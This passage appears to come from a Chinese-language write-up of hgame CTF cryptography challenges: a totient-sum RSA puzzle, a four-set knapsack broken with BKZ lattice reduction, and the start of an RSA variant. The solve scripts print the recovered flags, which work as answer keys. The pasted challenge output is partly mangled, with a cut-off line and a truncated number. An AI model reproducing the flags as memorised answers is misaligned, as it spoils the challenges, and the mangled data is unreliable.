i;<br>    &#125;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">char</span>&gt; <span class="hljs-title">is_prime</span><span class="hljs-params">(n + <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)</span></span>;<br>    is_prime[<span class="hljs-number">0</span>] = is_prime[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>    vector&lt;<span class="hljs-type">uint32_t</span>&gt; primes;<br>    primes.<span class="hljs-built_in">reserve</span>(n / <span class="hljs-number">20</span>);             <span class="hljs-comment">// 预估质数数量</span><br><br>    <span class="hljs-type">uint64_t</span> total = <span class="hljs-number">1</span>;                 <span class="hljs-comment">// φ(1) = 1</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">uint64_t</span> i = <span class="hljs-number">2</span>; i &lt;= n; ++i) <br>    &#123;<br>        <span class="hljs-keyword">if</span> (is_prime[i]) <br>        &#123;<br>            primes.<span class="hljs-built_in">push_back</span>(i);<br>            phi[i] = i - <span class="hljs-number">1</span>;<br>        &#125;<br>        total += phi[i];                <span class="hljs-comment">// 累加当前φ(i)</span><br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> p : primes) <br>        &#123;<br>            <span class="hljs-keyword">if</span> (p &gt; n / i) <span class="hljs-keyword">break</span>;       <span class="hljs-comment">// 防止i*p溢出</span><br>            <span class="hljs-type">uint64_t</span> m = i * p;<br>            is_prime[m] = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">if</span> (i % p == <span class="hljs-number">0</span>) <br>            &#123;<br>                phi[m] = phi[i] * p;<br>                <span class="hljs-keyword">break</span>;<br>            &#125; <span class="hljs-keyword">else</span> <br>            &#123;<br>                phi[m] = phi[i] * (p - <span class="hljs-number">1</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    cout &lt;&lt; <span class="hljs-string">&quot;ans=&quot;</span> &lt;&lt; total &lt;&lt; endl;    <span class="hljs-comment">//155763335410704472</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> nextprime<br><span class="hljs-keyword">import</span> gmpy2<br><br>e = <span class="hljs-number">65537</span><br>k = e*e//<span class="hljs-number">6</span><br>sum_phi=<span class="hljs-number">155763335410704472</span>  <span class="hljs-comment">#上个脚本中求出的值</span><br>enc = <span class="hljs-number">2449294097474714136530140099784592732766444481665278038069484466665506153967851063209402336025065476172617376546</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sieve_prime</span>(<span class="hljs-params">n: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">list</span>:<br>    <span class="hljs-comment">#厄拉托塞筛法</span><br>    <span class="hljs-keyword">if</span> n &lt; <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">return</span> []<br>    <span class="hljs-keyword">elif</span> n == <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">return</span> [<span class="hljs-number">2</span>]<br>    end = (n - <span class="hljs-number">3</span>) // <span class="hljs-number">2</span><br>    is_prime = [<span class="hljs-literal">True</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(end + <span class="hljs-number">1</span>)]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>, <span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(n, <span class="hljs-number">0.5</span>)) + <span class="hljs-number">1</span>, <span class="hljs-number">2</span>):<br>        k = (i - <span class="hljs-number">3</span>) // <span class="hljs-number">2</span>  <br>        <span class="hljs-keyword">if</span> is_prime[k]:<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i * i, n + <span class="hljs-number">1</span>, <span class="hljs-number">2</span> * i):<br>                is_prime[(j - <span class="hljs-number">3</span>) // <span class="hljs-number">2</span>] = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> [<span class="hljs-number">2</span>] + [<span class="hljs-number">2</span> * i + <span class="hljs-number">3</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(end + <span class="hljs-number">1</span>) <span class="hljs-keyword">if</span> is_prime[i]]<br><br>prime_list = sieve_prime(k)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;first 10 prime:&quot;</span>, prime_list[:<span class="hljs-number">10</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;last 10 prime:&quot;</span>, prime_list[-<span class="hljs-number">10</span>:])<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;num== &quot;</span>,<span class="hljs-built_in">len</span>(prime_list))<br>trick_k = sum_phi + <span class="hljs-built_in">len</span>(prime_list)<br><br>shifted = trick_k &lt;&lt; <span class="hljs-number">128</span><br>p=nextprime(shifted)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;p== &quot;</span>,p)<br>n = p * p<br>phi = p * (p - <span class="hljs-number">1</span>)<br><br>d=gmpy2.invert(e,phi)<br><span class="hljs-built_in">print</span>(d)<br><br>m = <span class="hljs-built_in">pow</span>(enc, d, n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))  <span class="hljs-comment">#b&#x27;hgame&#123;sieve_is_n0t_that_HArd&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="2-ezbag"><a href="#2-ezbag" class="headerlink" title="2.ezbag"></a>2.ezbag</h2><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> flag<br><br><br><span class="hljs-built_in">list</span> = []<br>bag = []<br>p=random.getrandbits(<span class="hljs-number">64</span>)    <br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>(p)[<span class="hljs-number">2</span>:])==<span class="hljs-number">64</span> <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):                              <br>    t = p<br>    a=[getPrime(<span class="hljs-number">32</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>)]        <br>    b=<span class="hljs-number">0</span>                                        <br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> a:<br>        temp=t%<span class="hljs-number">2</span>                               <br>        b+=temp*x                              <br>        t=t&gt;&gt;<span class="hljs-number">1</span>                                <br>    <span class="hljs-built_in">list</span>.append(a)                             <br>    bag.append(b)                              <br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;list=<span class="hljs-subst">&#123;<span class="hljs-built_in">list</span>&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;bag=<span class="hljs-subst">&#123;bag&#125;</span>&#x27;</span>)<br><br>key = hashlib.sha256(<span class="hljs-built_in">str</span>(p).encode()).digest()  <br>cipher = AES.new(key, AES.MODE_ECB)             <br>flag = pad(flag,<span class="hljs-number">16</span>)                            <br>ciphertext = cipher.encrypt(flag)              <br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ciphertext=<span class="hljs-subst">&#123;ci</span></span><br><span class="hljs-subst"><span class="hljs-string"></span></span><br><span class="hljs-subst"><span class="hljs-string"><span class="hljs-string">&quot;&quot;&quot;</span></span></span><br><span class="hljs-string"><span class="hljs-subst"><span class="hljs-string">list=[[2826962231, 3385780583, 3492076631, 3387360133, 2955228863, 2289302839, 2243420737, 4129435549, 4249730059, 3553886213, 3506411549, 3658342997, 3701237861, 4279828309, 2791229339, 4234587439, 3870221273, 2989000187, 2638446521, 3589355327, 3480013811, 3581260537, 2347978027, 3160283047, 2416622491, 2349924443, 3505689469, 2641360481, 3832581799, 2977968451, 4014818999, 3989322037, 4129732829, 2339590901, 2342044303, 3001936603, 2280479471, 3957883273, 3883572877, 3337404269, 2665725899, 3705443933, 2588458577, 4003429009, 2251498177, 2781146657, 2654566039, 2426941147, 2266273523, 3210546259, 4225393481, 2304357101, 2707182253, 2552285221, 2337482071, 3096745679, 2391352387, 2437693507, 3004289807, 3857153537, 3278380013, 3953239151, 3486836107, 4053147071], [2241199309, 3658417261, 3032816659, 3069112363, 4279647403, 3244237531, 2683855087, 2980525657, 3519354793, 3290544091, 2939387147, 3669562427, 2985644621, 2961261073, 2403815549, 3737348917, 2672190887, 2363609431, 3342906361, 3298900981, 3874372373, 4287595129, 2154181787, 3475235893, 2223142793, 2871366073, 3443274743, 3162062369, 2260958543, 3814269959, 2429223151, 3363270901, 2623150861, 2424081661, 2533866931, 4087230569, 2937330469, 3846105271, 3805499729, 4188683131, 2804029297, 2707569353, 4099160981, 3491097719, 3917272979, 2888646377, 3277908071, 2892072971, 2817846821, 2453222423, 3023690689, 3533440091, 3737441353, 3941979749, 2903000761, 3845768239, 2986446259, 3630291517, 3494430073, 2199813137, 2199875113, 3794307871, 2249222681, 2797072793], [4263404657, 3176466407, 3364259291, 4201329877, 3092993861, 2771210963, 3662055773, 3124386037, 2719229677, 3049601453, 2441740487, 3404893109, 3327463897, 3742132553, 2833749769, 2661740833, 3676735241, 2612560213, 3863890813, 3792138377, 3317100499, 2967600989, 2256580343, 2471417173, 2855972923, 2335151887, 3942865523, 2521523309, 3183574087, 2956241693, 2969535607, 2867142053, 2792698229, 3058509043, 3359416111, 3375802039, 2859136043, 3453019013, 3817650721, 2357302273, 3522135839, 2997389687, 3344465713, 2223415097, 2327459153, 3383532121, 3960285331, 3287780827, 4227379109, 3679756219, 2501304959, 4184540251, 3918238627, 3253307467, 3543627671, 3975361669, 3910013423, 3283337633, 2796578957, 2724872291, 2876476727, 4095420767, 3011805113, 2620098961], [2844773681, 3852689429, 4187117513, 3608448149, 2782221329, 4100198897, 3705084667, 2753126641, 3477472717, 3202664393, 3422548799, 3078632299, 3685474021, 3707208223, 2626532549, 3444664807, 4207188437, 3422586733, 2573008943, 2992551343, 3465105079, 4260210347, 3108329821, 3488033819, 4092543859, 4184505881, 3742701763, 3957436129, 4275123371, 3307261673, 2871806527, 3307283633, 2813167853, 2319911773, 3454612333, 4199830417, 3309047869, 2506520867, 3260706133, 2969837513, 4056392609, 3819612583, 3520501211, 2949984967, 4234928149, 2690359687, 3052841873, 4196264491, 3493099081, 3774594497, 4283835373, 2753384371, 2215041107, 4054564757, 4074850229, 2936529709, 2399732833, 3078232933, 2922467927, 3832061581, 3871240591, 3526620683, 2304071411, 367956082</span></span></span><br><span class="hljs-string"><span class="hljs-subst"><span class="hljs-string">bag=[123342809734, 118191282440, 119799979406, 128273451872]</span></span></span><br><span class="hljs-string"><span class="hljs-subst"><span class="hljs-string">ciphertext=b&#x27;\x1d6\xcc&#125;\x07\xfa7G\xbd\x01\xf0P4^Q&quot;\x85\x9f\xac\x98\x8f#\xb2\x12\xf4+\x05`\x80\x1a\xfa !\x9b\xa5\xc7g\xa8b\x89\x93\x1e\xedz\xd2M;\xa2&#x27;</span></span></span><br><span class="hljs-string"><span class="hljs-subst"><span class="hljs-string">&quot;&quot;&quot;</span></span></span><br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>稍微变形了的背包密码，同时出现了四组背包。</p><p>构造格，但LLL算法格不出，这里用BKZ出结果了。</p><span>$$[x_1,x_2,...,x_{64},-1]\\\begin{bmatrix}2 & 0 & 0 & \cdots & 0 & list[3][-1] & list[2][-1] & list[1][-1] &list[0][-1]\\0 & 2 & 0 & \cdots & 0 & list[3][-2] & list[2][-2] & list[1][-2] &list[0][-2]\\\vdots & \vdots & \vdots & \ddots & \vdots &\vdots & \vdots & \vdots & \vdots \\0 & 0 & 0 & \cdots & 2 & list[3][0] & list[2][0] & list[1][0] &list[0][0]\\1 & 1 & 1 & \cdots & 1 & bag[3] & bag[2] & bag[1] & bag[0]\end{bmatrix}\\=[2x_1-1,2x_2-1,...,2x_{64}-1,0,0,0,0]$$</span><p><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><span class="hljs-built_in">list</span>=[[<span class="hljs-number">2826962231</span>, <span class="hljs-number">3385780583</span>, <span class="hljs-number">3492076631</span>, <span class="hljs-number">3387360133</span>, <span class="hljs-number">2955228863</span>, <span class="hljs-number">2289302839</span>, <span class="hljs-number">2243420737</span>, <span class="hljs-number">4129435549</span>, <span class="hljs-number">4249730059</span>, <span class="hljs-number">3553886213</span>, <span class="hljs-number">3506411549</span>, <span class="hljs-number">3658342997</span>, <span class="hljs-number">3701237861</span>, <span class="hljs-number">4279828309</span>, <span class="hljs-number">2791229339</span>, <span class="hljs-number">4234587439</span>, <span class="hljs-number">3870221273</span>, <span class="hljs-number">2989000187</span>, <span class="hljs-number">2638446521</span>, <span class="hljs-number">3589355327</span>, <span class="hljs-number">3480013811</span>, <span class="hljs-number">3581260537</span>, <span class="hljs-number">2347978027</span>, <span class="hljs-number">3160283047</span>, <span class="hljs-number">2416622491</span>, <span class="hljs-number">2349924443</span>, <span class="hljs-number">3505689469</span>, <span class="hljs-number">2641360481</span>, <span class="hljs-number">3832581799</span>, <span class="hljs-number">2977968451</span>, <span class="hljs-number">4014818999</span>, <span class="hljs-number">3989322037</span>, <span class="hljs-number">4129732829</span>, <span class="hljs-number">2339590901</span>, <span class="hljs-number">2342044303</span>, <span class="hljs-number">3001936603</span>, <span class="hljs-number">2280479471</span>, <span class="hljs-number">3957883273</span>, <span class="hljs-number">3883572877</span>, <span class="hljs-number">3337404269</span>, <span class="hljs-number">2665725899</span>, <span class="hljs-number">3705443933</span>, <span class="hljs-number">2588458577</span>, <span class="hljs-number">4003429009</span>, <span class="hljs-number">2251498177</span>, <span class="hljs-number">2781146657</span>, <span class="hljs-number">2654566039</span>, <span class="hljs-number">2426941147</span>, <span class="hljs-number">2266273523</span>, <span class="hljs-number">3210546259</span>, <span class="hljs-number">4225393481</span>, <span class="hljs-number">2304357101</span>, <span class="hljs-number">2707182253</span>, <span class="hljs-number">2552285221</span>, <span class="hljs-number">2337482071</span>, <span class="hljs-number">3096745679</span>, <span class="hljs-number">2391352387</span>, <span class="hljs-number">2437693507</span>, <span class="hljs-number">3004289807</span>, <span class="hljs-number">3857153537</span>, <span class="hljs-number">3278380013</span>, <span class="hljs-number">3953239151</span>, <span class="hljs-number">3486836107</span>, <span class="hljs-number">4053147071</span>], [<span class="hljs-number">2241199309</span>, <span class="hljs-number">3658417261</span>, <span class="hljs-number">3032816659</span>, <span class="hljs-number">3069112363</span>, <span class="hljs-number">4279647403</span>, <span class="hljs-number">3244237531</span>, <span class="hljs-number">2683855087</span>, <span class="hljs-number">2980525657</span>, <span class="hljs-number">3519354793</span>, <span class="hljs-number">3290544091</span>, <span class="hljs-number">2939387147</span>, <span class="hljs-number">3669562427</span>, <span class="hljs-number">2985644621</span>, <span class="hljs-number">2961261073</span>, <span class="hljs-number">2403815549</span>, <span class="hljs-number">3737348917</span>, <span class="hljs-number">2672190887</span>, <span class="hljs-number">2363609431</span>, <span class="hljs-number">3342906361</span>, <span class="hljs-number">3298900981</span>, <span class="hljs-number">3874372373</span>, <span class="hljs-number">4287595129</span>, <span class="hljs-number">2154181787</span>, <span class="hljs-number">3475235893</span>, <span class="hljs-number">2223142793</span>, <span class="hljs-number">2871366073</span>, <span class="hljs-number">3443274743</span>, <span class="hljs-number">3162062369</span>, <span class="hljs-number">2260958543</span>, <span class="hljs-number">3814269959</span>, <span class="hljs-number">2429223151</span>, <span class="hljs-number">3363270901</span>, <span class="hljs-number">2623150861</span>, <span class="hljs-number">2424081661</span>, <span class="hljs-number">2533866931</span>, <span class="hljs-number">4087230569</span>, <span class="hljs-number">2937330469</span>, <span class="hljs-number">3846105271</span>, <span class="hljs-number">3805499729</span>, <span class="hljs-number">4188683131</span>, <span class="hljs-number">2804029297</span>, <span class="hljs-number">2707569353</span>, <span class="hljs-number">4099160981</span>, <span class="hljs-number">3491097719</span>, <span class="hljs-number">3917272979</span>, <span class="hljs-number">2888646377</span>, <span class="hljs-number">3277908071</span>, <span class="hljs-number">2892072971</span>, <span class="hljs-number">2817846821</span>, <span class="hljs-number">2453222423</span>, <span class="hljs-number">3023690689</span>, <span class="hljs-number">3533440091</span>, <span class="hljs-number">3737441353</span>, <span class="hljs-number">3941979749</span>, <span class="hljs-number">2903000761</span>, <span class="hljs-number">3845768239</span>, <span class="hljs-number">2986446259</span>, <span class="hljs-number">3630291517</span>, <span class="hljs-number">3494430073</span>, <span class="hljs-number">2199813137</span>, <span class="hljs-number">2199875113</span>, <span class="hljs-number">3794307871</span>, <span class="hljs-number">2249222681</span>, <span class="hljs-number">2797072793</span>], [<span class="hljs-number">4263404657</span>, <span class="hljs-number">3176466407</span>, <span class="hljs-number">3364259291</span>, <span class="hljs-number">4201329877</span>, <span class="hljs-number">3092993861</span>, <span class="hljs-number">2771210963</span>, <span class="hljs-number">3662055773</span>, <span class="hljs-number">3124386037</span>, <span class="hljs-number">2719229677</span>, <span class="hljs-number">3049601453</span>, <span class="hljs-number">2441740487</span>, <span class="hljs-number">3404893109</span>, <span class="hljs-number">3327463897</span>, <span class="hljs-number">3742132553</span>, <span class="hljs-number">2833749769</span>, <span class="hljs-number">2661740833</span>, <span class="hljs-number">3676735241</span>, <span class="hljs-number">2612560213</span>, <span class="hljs-number">3863890813</span>, <span class="hljs-number">3792138377</span>, <span class="hljs-number">3317100499</span>, <span class="hljs-number">2967600989</span>, <span class="hljs-number">2256580343</span>, <span class="hljs-number">2471417173</span>, <span class="hljs-number">2855972923</span>, <span class="hljs-number">2335151887</span>, <span class="hljs-number">3942865523</span>, <span class="hljs-number">2521523309</span>, <span class="hljs-number">3183574087</span>, <span class="hljs-number">2956241693</span>, <span class="hljs-number">2969535607</span>, <span class="hljs-number">2867142053</span>, <span class="hljs-number">2792698229</span>, <span class="hljs-number">3058509043</span>, <span class="hljs-number">3359416111</span>, <span class="hljs-number">3375802039</span>, <span class="hljs-number">2859136043</span>, <span class="hljs-number">3453019013</span>, <span class="hljs-number">3817650721</span>, <span class="hljs-number">2357302273</span>, <span class="hljs-number">3522135839</span>, <span class="hljs-number">2997389687</span>, <span class="hljs-number">3344465713</span>, <span class="hljs-number">2223415097</span>, <span class="hljs-number">2327459153</span>, <span class="hljs-number">3383532121</span>, <span class="hljs-number">3960285331</span>, <span class="hljs-number">3287780827</span>, <span class="hljs-number">4227379109</span>, <span class="hljs-number">3679756219</span>, <span class="hljs-number">2501304959</span>, <span class="hljs-number">4184540251</span>, <span class="hljs-number">3918238627</span>, <span class="hljs-number">3253307467</span>, <span class="hljs-number">3543627671</span>, <span class="hljs-number">3975361669</span>, <span class="hljs-number">3910013423</span>, <span class="hljs-number">3283337633</span>, <span class="hljs-number">2796578957</span>, <span class="hljs-number">2724872291</span>, <span class="hljs-number">2876476727</span>, <span class="hljs-number">4095420767</span>, <span class="hljs-number">3011805113</span>, <span class="hljs-number">2620098961</span>], [<span class="hljs-number">2844773681</span>, <span class="hljs-number">3852689429</span>, <span class="hljs-number">4187117513</span>, <span class="hljs-number">3608448149</span>, <span class="hljs-number">2782221329</span>, <span class="hljs-number">4100198897</span>, <span class="hljs-number">3705084667</span>, <span class="hljs-number">2753126641</span>, <span class="hljs-number">3477472717</span>, <span class="hljs-number">3202664393</span>, <span class="hljs-number">3422548799</span>, <span class="hljs-number">3078632299</span>, <span class="hljs-number">3685474021</span>, <span class="hljs-number">3707208223</span>, <span class="hljs-number">2626532549</span>, <span class="hljs-number">3444664807</span>, <span class="hljs-number">4207188437</span>, <span class="hljs-number">3422586733</span>, <span class="hljs-number">2573008943</span>, <span class="hljs-number">2992551343</span>, <span class="hljs-number">3465105079</span>, <span class="hljs-number">4260210347</span>, <span class="hljs-number">3108329821</span>, <span class="hljs-number">3488033819</span>, <span class="hljs-number">4092543859</span>, <span class="hljs-number">4184505881</span>, <span class="hljs-number">3742701763</span>, <span class="hljs-number">3957436129</span>, <span class="hljs-number">4275123371</span>, <span class="hljs-number">3307261673</span>, <span class="hljs-number">2871806527</span>, <span class="hljs-number">3307283633</span>, <span class="hljs-number">2813167853</span>, <span class="hljs-number">2319911773</span>, <span class="hljs-number">3454612333</span>, <span class="hljs-number">4199830417</span>, <span class="hljs-number">3309047869</span>, <span class="hljs-number">2506520867</span>, <span class="hljs-number">3260706133</span>, <span class="hljs-number">2969837513</span>, <span class="hljs-number">4056392609</span>, <span class="hljs-number">3819612583</span>, <span class="hljs-number">3520501211</span>, <span class="hljs-number">2949984967</span>, <span class="hljs-number">4234928149</span>, <span class="hljs-number">2690359687</span>, <span class="hljs-number">3052841873</span>, <span class="hljs-number">4196264491</span>, <span class="hljs-number">3493099081</span>, <span class="hljs-number">3774594497</span>, <span class="hljs-number">4283835373</span>, <span class="hljs-number">2753384371</span>, <span class="hljs-number">2215041107</span>, <span class="hljs-number">4054564757</span>, <span class="hljs-number">4074850229</span>, <span class="hljs-number">2936529709</span>, <span class="hljs-number">2399732833</span>, <span class="hljs-number">3078232933</span>, <span class="hljs-number">2922467927</span>, <span class="hljs-number">3832061581</span>, <span class="hljs-number">3871240591</span>, <span class="hljs-number">3526620683</span>, <span class="hljs-number">2304071411</span>, <span class="hljs-number">3679560821</span>]]<br>bag=[<span class="hljs-number">123342809734</span>, <span class="hljs-number">118191282440</span>, <span class="hljs-number">119799979406</span>, <span class="hljs-number">128273451872</span>]<br>ciphertext=<span class="hljs-string">b&#x27;\x1d6\xcc&#125;\x07\xfa7G\xbd\x01\xf0P4^Q&quot;\x85\x9f\xac\x98\x8f#\xb2\x12\xf4+\x05`\x80\x1a\xfa !\x9b\xa5\xc7g\xa8b\x89\x93\x1e\xedz\xd2M;\xa2&#x27;</span><br><br>L=Matrix(ZZ,<span class="hljs-number">65</span>,<span class="hljs-number">68</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>    L[i,i]=<span class="hljs-number">2</span><br>    L[i,-<span class="hljs-number">1</span>]=<span class="hljs-built_in">list</span>[<span class="hljs-number">0</span>][-i-<span class="hljs-number">1</span>]<br>    L[i,-<span class="hljs-number">2</span>]=<span class="hljs-built_in">list</span>[<span class="hljs-number">1</span>][-i-<span class="hljs-number">1</span>]<br>    L[i,-<span class="hljs-number">3</span>]=<span class="hljs-built_in">list</span>[<span class="hljs-number">2</span>][-i-<span class="hljs-number">1</span>]<br>    L[i,-<span class="hljs-number">4</span>]=<span class="hljs-built_in">list</span>[<span class="hljs-number">3</span>][-i-<span class="hljs-number">1</span>]<br>L[-<span class="hljs-number">1</span>,:]=<span class="hljs-number">1</span><br>L[-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>]=bag[<span class="hljs-number">0</span>]<br>L[-<span class="hljs-number">1</span>,-<span class="hljs-number">2</span>]=bag[<span class="hljs-number">1</span>]<br>L[-<span class="hljs-number">1</span>,-<span class="hljs-number">3</span>]=bag[<span class="hljs-number">2</span>]<br>L[-<span class="hljs-number">1</span>,-<span class="hljs-number">4</span>]=bag[<span class="hljs-number">3</span>]<br>x=L.BKZ()<br><span class="hljs-built_in">print</span>(x[<span class="hljs-number">0</span>])<br>p=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x[<span class="hljs-number">0</span>][:<span class="hljs-number">64</span>]:<br>    <span class="hljs-keyword">if</span> i==<span class="hljs-number">1</span>:<br>        p+=<span class="hljs-string">&#x27;1&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        p+=<span class="hljs-string">&#x27;0&#x27;</span><br>p=<span class="hljs-built_in">int</span>(p,<span class="hljs-number">2</span>)<br>key = hashlib.sha256(<span class="hljs-built_in">str</span>(p).encode()).digest()<br>cipher = AES.new(key, AES.MODE_ECB)<br>flag = cipher.decrypt(ciphertext)<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#b&#x27;hgame&#123;A_S1mple_Modul@r_Subset_Sum_Problem&#125;\x06\x06\x06\x06\x06\x06&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="3-suprimeRSA"><a href="#3-suprimeRSA" class="headerlink" title="3.suprimeRSA"></a>3.suprimeRSA</h2><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> prime<br><br>FLAG=<span class="hljs-string">b&#x27;hgame&#123;xxxxxxxxxxxxxxxxxx&#125;&#x27;</span>           <span class="hljs-comment">#已知部分明文</span><br>e=<span class="hljs-number">0x10001</span>                                   <span class="hljs-comment">#e=65537</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">primorial</span>(<span class="hljs-params">num</span>):                         <span class="hljs-comment">#primorial的意思是所有小于或等于某个给定素数的素数的乘积。</span><br>    result = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, num + <span class="hljs-number">1</span>):<br>        result *= prime(i)<br>    <span class="hljs-keyword">return</span> result<br>M=primorial(random.choice([<span class="hljs-number">39</span>,<span class="hljs-number">71</span>,<span class="hljs-number">126</span>]))     <span class="hljs-comment">#M=小于等于39，71，126中随机一个数的素数的乘积</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_key</span>():<br>    <span class="hljs-keyword">while</span> <span 